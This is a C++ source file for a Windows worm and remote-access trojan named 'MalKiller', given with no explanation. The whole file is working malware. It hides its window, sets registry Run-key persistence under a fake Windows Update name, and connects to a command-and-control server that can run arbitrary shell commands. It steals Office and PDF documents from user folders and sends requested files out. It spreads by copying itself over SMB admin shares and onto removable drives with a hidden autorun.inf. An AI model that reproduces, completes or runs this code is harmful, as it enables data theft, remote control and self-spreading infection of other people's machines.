#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <lm.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <fstream>
#include <sstream>
#include <shlobj.h>
#include <shlwapi.h>
#include <urlmon.h>
#include <wininet.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")

class MalKiller {
private:
    std::vector<std::string> discoveredHosts;
    std::string c2Server = "192.168.1.100";
    int c2Port = 443;
    bool isRunning = true;
    SOCKET c2Socket;

    std::string getCurrentPath() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }

    void establishPersistence() {
        HKEY hKey;
        std::string path = getCurrentPath();
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExA(hKey, "WindowsUpdateService", 0, REG_SZ, (const BYTE*)path.c_str(), path.length());
        RegCloseKey(hKey);
    }

    void hideProcess() {
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);
    }

    bool connectToC2() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;
        
        c2Socket = socket(AF_INET, SOCK_STREAM, 0);
        if (c2Socket == INVALID_SOCKET) return false;
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(c2Port);
        inet_pton(AF_INET, c2Server.c_str(), &serverAddr.sin_addr);
        
        if (connect(c2Socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(c2Socket);
            WSACleanup();
            return false;
        }
        return true;
    }

    std::string receiveCommand() {
        char buffer[4096];
        int bytesReceived = recv(c2Socket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            return std::string(buffer, bytesReceived);
        }
        return "";
    }

    void sendData(const std::string& data) {
        send(c2Socket, data.c_str(), data.length(), 0);
    }

    void discoverNetworkHosts() {
        PMIB_IPNETTABLE pArpTable = NULL;
        ULONG ulSize = 0;
        DWORD dwRet = GetIpNetTable(pArpTable, &ulSize, FALSE);
        if (dwRet == ERROR_INSUFFICIENT_BUFFER) {
            pArpTable = (PMIB_IPNETTABLE)malloc(ulSize);
            dwRet = GetIpNetTable(pArpTable, &ulSize, FALSE);
        }

        if (dwRet == NO_ERROR) {
            for (DWORD i = 0; i < pArpTable->dwNumEntries; i++) {
                IN_ADDR ipAddr;
                ipAddr.S_un.S_addr = pArpTable->table[i].dwAddr;
                char* ipStr = inet_ntoa(ipAddr);
                if (ipStr && strcmp(ipStr, "0.0.0.0") != 0) {
                    discoveredHosts.push_back(ipStr);
                }
            }
        }
        if (pArpTable) free(pArpTable);
    }

    bool copyToShare(const std::string& remotePath) {
        std::string localFile = getCurrentPath();
        return CopyFileA(localFile.c_str(), remotePath.c_str(), FALSE);
    }

    bool executeRemote(const std::string& remotePath) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        std::string cmd = "cmd.exe /C \"" + remotePath + "\"";
        return CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    void attemptSMBPropagation() {
        for (const auto& host : discoveredHosts) {
            std::string adminShare = "\\\\" + host + "\\ADMIN$\\System32\\spoolsv.exe";
            std::string cShare = "\\\\" + host + "\\C$\\Windows\\Temp\\svchost.exe";

            if (copyToShare(adminShare) || copyToShare(cShare)) {
                executeRemote(adminShare);
                executeRemote(cShare);
            }
        }
    }

    void infectRemovableDrives() {
        char drives[256];
        DWORD len = GetLogicalDriveStringsA(256, drives);
        char* drive = drives;

        while (*drive) {
            UINT type = GetDriveTypeA(drive);
            if (type == DRIVE_REMOVABLE || type == DRIVE_REMOTE) {
                std::string targetPath = std::string(drive) + "WindowsUpdate.exe";
                std::string autorunPath = std::string(drive) + "autorun.inf";

                CopyFileA(getCurrentPath().c_str(), targetPath.c_str(), FALSE);

                std::ofstream autorun(autorunPath);
                autorun << "[autorun]\n";
                autorun << "open=WindowsUpdate.exe\n";
                autorun << "shellexecute=WindowsUpdate.exe\n";
                autorun << "action=Open Windows Update\n";
                autorun.close();

                SetFileAttributesA(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                SetFileAttributesA(autorunPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            }
            drive += strlen(drive) + 1;
        }
    }

    std::vector<std::string> findDocuments() {
        std::vector<std::string> documents;
        char* folders[] = {
            "C:\\Users\\",
            "C:\\Documents and Settings\\"
        };
        
        const char* extensions[] = {
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
            ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp"
        };
        
        for (int f = 0; f < 2; f++) {
            WIN32_FIND_DATAA findFileData;
            HANDLE hFind = FindFirstFileA((std::string(folders[f]) + "*").c_str(), &findFileData);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        if (strcmp(findFileData.cFileName, ".") != 0 && 
                            strcmp(findFileData.cFileName, "..") != 0) {
                            
                            std::string userPath = std::string(folders[f]) + findFileData.cFileName + "\\Documents\\*";
                            HANDLE hDocFind = FindFirstFileA(userPath.c_str(), &findFileData);
                            
                            if (hDocFind != INVALID_HANDLE_VALUE) {
                                do {
                                    for (int e = 0; e < 12; e++) {
                                        if (PathMatchSpecA(findFileData.cFileName, 
                                            (std::string("*") + extensions[e]).c_str())) {
                                            documents.push_back(std::string(folders[f]) + findFileData.cFileName + 
                                                "\\Documents\\" + findFileData.cFileName);
                                        }
                                    }
                                } while (FindNextFileA(hDocFind, &findFileData));
                                FindClose(hDocFind);
                            }
                        }
                    }
                } while (FindNextFileA(hFind, &findFileData));
                FindClose(hFind);
            }
        }
        return documents;
    }

    void uploadDocuments() {
        std::vector<std::string> docs = findDocuments();
        for (const auto& doc : docs) {
            std::ifstream file(doc, std::ios::binary);
            if (file) {
                std::string content((std::istreambuf_iterator<char>(file)), 
                                   std::istreambuf_iterator<char>());
                std::string payload = "UPLOAD|" + doc + "|" + content;
                sendData(payload);
            }
        }
    }

    std::string executeCommand(const std::string& cmd) {
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) return "Error executing command";
        
        char buffer[128];
        std::string result = "";
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL)
                result += buffer;
        }
        _pclose(pipe);
        return result;
    }

    void handleC2Commands() {
        while (isRunning) {
            if (!connectToC2()) {
                Sleep(60000);
                continue;
            }
            
            std::string command = receiveCommand();
            if (!command.empty()) {
                if (command == "spread") {
                    discoverNetworkHosts();
                    attemptSMBPropagation();
                    infectRemovableDrives();
                } else if (command == "upload_docs") {
                    uploadDocuments();
                } else if (command.substr(0, 8) == "download") {
                    std::string filename = command.substr(9);
                    std::ifstream file(filename, std::ios::binary);
                    if (file) {
                        std::string content((std::istreambuf_iterator<char>(file)), 
                                           std::istreambuf_iterator<char>());
                        sendData("FILE|" + filename + "|" + content);
                    }
                } else if (command.substr(0, 4) == "exec") {
                    std::string cmd = command.substr(5);
                    std::string result = executeCommand(cmd);
                    sendData("CMD_RESULT|" + result);
                } else if (command == "exit") {
                    isRunning = false;
                }
            }
            
            closesocket(c2Socket);
            WSACleanup();
            Sleep(30000);
        }
    }

public:
    void run() {
        hideProcess();
        establishPersistence();
        
        std::thread c2Thread([this]() { handleC2Commands(); });
        std::thread propagationThread([this]() {
            while (isRunning) {
                discoverNetworkHosts();
                attemptSMBPropagation();
                infectRemovableDrives();
                Sleep(300000);
            }
        });
        
        c2Thread.join();
        propagationThread.join();
    }
};

int main() {
    MalKiller malware;
    malware.run();
    return 0;
}